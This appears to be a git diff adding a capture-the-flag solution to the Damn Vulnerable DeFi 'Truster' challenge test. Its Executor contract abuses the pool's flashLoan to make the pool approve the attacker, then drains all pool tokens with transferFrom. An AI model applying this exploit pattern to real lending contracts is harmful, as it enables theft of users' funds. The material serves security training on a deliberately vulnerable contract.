@@ -6,6 +6,34 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+import {ERC20} from "solmate/tokens/ERC20.sol";
+
+contract Executor {
+    TrusterLenderPool pool;
+    DamnValuableToken token;
+
+    constructor(address _pool, address _token) {
+        pool = TrusterLenderPool(_pool);
+        token = DamnValuableToken(_token);
+    }
+
+    function execute(address _recovery, uint256 _amount) public {
+        // 1. Aprove this contract to spend all the tokens from the pool
+        bytes memory data = abi.encodeCall(ERC20.approve, (address(this), _amount));
+        
+        // 2. Execute flashloan
+        pool.flashLoan(
+            0,
+            address(this),
+            address(token),
+            data
+        );
+
+        // 3. Transfer all the tokens from the pool to the recovery account
+        token.transferFrom(address(pool), _recovery, _amount);
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -51,7 +79,8 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        Executor e = new Executor(address(pool), address(token));
+        e.execute(recovery, TOKENS_IN_POOL);
     }
 
     /**
